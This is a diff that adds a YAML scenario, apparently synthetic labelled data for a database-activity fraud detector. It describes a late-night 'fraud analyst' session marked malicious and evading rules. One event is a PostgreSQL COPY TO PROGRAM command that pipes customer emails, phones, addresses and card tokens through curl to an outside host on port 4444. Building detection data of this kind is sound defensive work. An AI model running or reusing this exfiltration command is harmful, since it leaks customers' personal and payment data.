@@ -1,0 +1,24 @@
+scenario_id: ecommerce_fraud_analyst_exfil_0001
+family_id: ecommerce_fraud_analyst_exfil_0001
+domain: ecommerce
+time_of_day: 02:15
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: fraud_analyst
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.4999450294190344
+  events:
+  - sql: SELECT c.customer_id, c.email, c.shipping_address, COUNT(o.order_id) as order_count, SUM(o.total_amount) as total_spent FROM customers c JOIN orders o ON o.customer_id = c.customer_id GROUP BY
+      c.customer_id, c.email, c.shipping_address HAVING SUM(o.total_amount) > 10000
+  - step_id: exfil
+    sql: COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id)
+      TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'
+    connects_to:
+      ip: 45.33.12.9
+      port: 4444
